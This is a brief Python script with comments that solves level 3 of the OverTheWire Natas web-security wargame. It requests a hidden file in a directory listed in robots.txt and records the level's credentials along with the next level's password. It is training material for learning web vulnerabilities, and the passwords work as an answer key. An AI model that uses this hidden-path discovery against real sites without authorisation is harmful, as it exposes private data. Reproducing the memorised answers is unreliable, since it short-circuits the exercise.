#!/usr/bin/env python

import requests
import re

username = 'natas3'
password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'

url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt' % username

response = requests.get(url, auth=(username, password))
content = response.text

nextlevelpass = re.findall('<!--The password for natas4 is (.*) -->', content)


print content

# not even google will find it ----> so let's try /robots.txt
# there's a robots.txt and it's content is 
	#User-agent: *
	#Disallow: /s3cr3t/
#the content of /s3cr3t/ has an image of that has an ancor tag to users.txt, so let's go there
#and we got the password { natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ }




